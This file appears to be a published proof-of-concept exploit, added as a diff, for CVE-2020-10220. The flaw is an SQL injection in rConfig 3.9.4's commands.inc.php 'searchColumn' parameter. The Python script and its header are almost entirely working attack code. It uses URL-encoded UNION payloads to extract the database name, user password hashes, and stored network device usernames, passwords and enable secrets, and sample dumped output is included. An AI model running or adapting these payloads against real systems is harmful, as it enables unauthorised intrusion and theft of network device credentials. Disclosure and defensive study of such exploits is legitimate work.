@@ -1,0 +1,107 @@
+# Exploit Title: rConfig 3.9 - 'searchColumn' SQL Injection
+# Exploit Author: vikingfr
+# Date: 2020-03-03
+# CVE-2020-10220
+# Exploit link : https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py
+# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
+# Software Link : https://www.rconfig.com/downloads/rconfig-3.9.4.zip
+# Install scripts  : 
+# https://www.rconfig.com/downloads/scripts/install_rConfig.sh
+# https://www.rconfig.com/downloads/scripts/centos7_install.sh
+# https://www.rconfig.com/downloads/scripts/centos6_install.sh
+# Version: tested v3.9.4
+# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
+#
+# Notes : If you want to reproduce in your lab environment follow those links :
+# http://help.rconfig.com/gettingstarted/installation
+# then
+# http://help.rconfig.com/gettingstarted/postinstall
+#
+# $ python3 rconfig_sqli.py https://1.1.1.1
+# rconfig 3.9 - SQL Injection PoC
+# [+] Triggering the payloads on https://1.1.1.1/commands.inc.php
+# [+] Extracting the current DB name :
+# rconfig2
+# [+] Extracting 10 first users :
+# admin:1:63a9f0ea7bb98050796b649e85481845
+# Maybe no more information ?
+# Maybe no more information ?
+# [snip]
+# [+] Extracting 10 first devices :
+# 127-0-0-1:127.0.0.1::ocdvulnpass:
+# deviceTestName:1.1.1.1:myusertest:mysecret:myenablesecret
+# Maybe no more information ?
+# Maybe no more information ?
+# [snip]
+# Done
+ 
+
+#!/usr/bin/python3
+import requests
+import sys
+import urllib.parse
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+print ("rconfig 3.9 - SQL Injection PoC")
+if len(sys.argv) != 2:
+    print ("[+] Usage : ./rconfig_exploit.py https://target")
+    exit()
+
+vuln_page="/commands.inc.php"
+vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"
+given_target = sys.argv[1]
+target =  given_target
+target += vuln_page
+target += vuln_parameters
+
+request = requests.session()
+dashboard_request = request.get(target+vuln_page, allow_redirects=False, verify=False)
+
+
+def extractDBinfos(myTarget=None,myPayload=None):
+	"""
+	Extract information from database
+	Args:
+		- target+payload (String)
+	Returns:
+		- payload result (String)
+	"""
+	result = ""
+	encoded_request = myTarget+myPayload
+	exploit_req = request.get(encoded_request)
+	if '[PWN]' in str(exploit_req.content):
+		result = str(exploit_req.content).split('[PWN]')[1]
+	else:
+		result="Maybe no more information ?"
+	
+	return result
+
+
+if dashboard_request.status_code != 404:
+	print ("[+] Triggering the payloads on "+given_target+vuln_page)
+	# get the db name
+	print ("[+] Extracting the current DB name :")
+	db_payload = "%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)%20limit%200,1),NULL--"
+	db_name = extractDBinfos(target,db_payload)
+	print (db_name)
+    # DB extract users
+	print ("[+] Extracting 10 first users :")
+	for i in range (0, 10):
+            user1_payload="%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,username,0x3A,id,0x3A,password,0x5B50574E5D3C42523E)%20FROM%20"+db_name+".users+limit+"+str(i)+","+str(i+1)+"),NULL--"
+            user_h = extractDBinfos(target,user1_payload)
+            #print ("[+] Dump device "+str(i))
+            print (user_h)
+    # DB extract devices information
+	print ("[+] Extracting 10 first devices :")
+	for i in range (0, 10):
+            device_payload="%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,deviceName,0x3A,deviceIpAddr,0x3A,deviceUsername,0x3A,devicePassword,0x3A,deviceEnablePassword,0x5B50574E5D3C42523E)%20FROM%20"+db_name+".nodes+limit+"+str(i)+","+str(i+1)+"),NULL--"
+            device_h = extractDBinfos(target,device_payload)
+            #print ("[+] Dump device "+str(i))
+            print (device_h)
+    
+	print ("Done")
+	               
+else:
+    print ("[-] Please verify the URI")
+    exit()
